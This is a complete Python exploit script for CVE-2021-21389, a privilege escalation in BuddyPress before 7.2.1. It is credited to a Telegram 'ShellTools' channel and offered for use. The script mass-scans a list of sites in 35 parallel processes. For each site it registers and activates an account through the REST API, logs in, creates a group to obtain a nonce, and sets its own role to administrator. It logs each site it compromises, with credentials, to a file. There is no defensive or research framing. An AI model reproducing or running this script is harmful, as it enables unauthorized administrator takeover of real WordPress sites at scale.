# CVE/Info:    2021-21389, BuddyPress < 7.2.1 - REST API Privilege Escalation
# Coded BY JEX Coder  => T.me/ShellTools

from requests import post, session, put
from random import choice
from string import ascii_letters
from json import loads, dumps
from re import findall, sub
import sys
from multiprocessing import Pool
from os import system, name

def clear():
    linux = 'clear'
    windows = 'cls'
    system([linux, windows][name == 'nt'])


def banner():
    sssss = '''
                        Coded BY JEX Coder [VIP]
              ____            _     _       _____                   
             |  _ \          | |   | |     |  __ \                  
             | |_) |_   _  __| | __| |_   _| |__) | __ ___  ___ ___ 
             |  _ <| | | |/ _` |/ _` | | | |  ___/ '__/ _ \/ __/ __|
             | |_) | |_| | (_| | (_| | |_| | |   | | |  __/\__ \__ _
             |____/ \__,_|\__,_|\__,_|\__, |_|   |_|  \___||___/___/
                                       __/ |                        
                                      |___/  
        BuddyPress < 7.2.1 - REST API Privilege Escalation  - CVE-2021-21389
                           T.me/ShellTools                                      


    '''
    print(sssss)


def random_char(y):
    return ''.join(choice(ascii_letters) for x in range(y))


def register(url, username, password):
    headerx = {
        "Content-Type": "application/json; charset=UTF-8"
    }
    data = {
        "user_login": username,
        "user_email": random_char(7) + "@test.com",
        "user_name": username,
        "password": password
    }
    try:
        r = post('http://' + url + "/wp-json/buddypress/v1/signup", headers=headerx, data=dumps(data))
        if r.status_code == 500:
            Wp_login(url, username, password)
        elif r.status_code == 404:
            print(' {} NOT Vulnerable!'.format(url))
        else:
            data = loads(r.text)
            activation_key = data[0]["activation_key"]
            put('http://' + url + "/wp-json/buddypress/v1/signup/activate/" + activation_key)
            Wp_login(url, username, password)
    except:
        print(' {} NOT Vulnerable!'.format(url))



def Wp_login(domain, username, password):
    Wp_session = session()
    Origin = domain
    try:
        Origin = domain.split('/')[0]
    except:
        pass
    data = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log+In',
        'redirect_to': 'http://{}/wp-admin/'.format(domain),
        'testcookie': '1'
    }
    pH = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'http://' + Origin,
        'Host': Origin,
        'Referer': 'http://' + Origin + '/wp-login.php',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0'
    }
    url = 'http://' + domain + '/wp-login.php'
    try:
        ag = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0'}
        Wp_session.get('http://' + domain + '/wp-login.php', timeout=5, headers=ag)
        X = Wp_session.post(url, data=data, headers=pH, timeout=5, allow_redirects=False)
        if 'id="login_error' in X.text:
            print(' {} NOT Vulnerable!'.format(url))
        elif 'wordpress_logged_in' in str(X.cookies):
            open('Registered.txt', 'a').write('{},{},{}\n'.format(domain + '/wp-login.php', username, password))
            print(' {} EXPLOITED> !~~~'.format(url))
            return Wp_session
        else:
            print(' {} NOT Vulnerable!'.format(url))
    except:
        print(' {} NOT Vulnerable!'.format(url))


def createNewgroup(url, s, username):
    try:
        response = s.get('http://' + url + "/groups/create/step/group-details/")
        _wp_nonce = findall(r'name="_wpnonce" value="(\w+)"', response.text)[0]
        group_name = "vuln" + username
        files = {
            'group-name': (None, group_name),
            'group-desc': (None, group_name),
            '_wpnonce': (None, _wp_nonce),
            'group-id': (None, '0'),
            'save': (None, 'Create Group and Continue')
        }
        s.post(url + "/groups/create/step/group-details/", files=files)
        resp = s.get(url + "/groups/" + group_name + "/admin/manage-members/")
        wp_nonce = findall('var wpApiSettings = .*\;', resp.text)
        wp_nonce = sub('^.*\"nonce\"\:\"', '', wp_nonce[0])
        x_wp_nonce = sub('\".*$', '', wp_nonce)
        return x_wp_nonce
    except:
        return None


def privilegeEscalation(url, s, x_wp_nonce):
    headerx = {
        'X-WP-Nonce': x_wp_nonce,
        "Content-Type": "application/json; charset=UTF-8"
    }
    data = {
        "roles": "administrator"
    }
    try:
        s.post('http://' + url + "/wp-json/buddypress/v1/members/me", headers=headerx, data=dumps(data))
    except:
        pass

def Exploit_CVE_2021_21389(site):
    username = 'Bot1337'
    password = 'B0t@123456'
    register(site, username, password)
    sess = Wp_login(site, username, password)
    x_wp_nonce = createNewgroup(site, sess, username)
    privilegeEscalation(site, sess, x_wp_nonce)



if __name__ == '__main__':
    try:
        clear()
        banner()
        sites = open(sys.argv[1], 'r').read().splitlines()
        p = Pool(35)
        p.map(Exploit_CVE_2021_21389, sites)
    except:
        clear()
        banner()
        print('     usage: python {} sites.txt'.format(sys.argv[0]))
        sys.exit()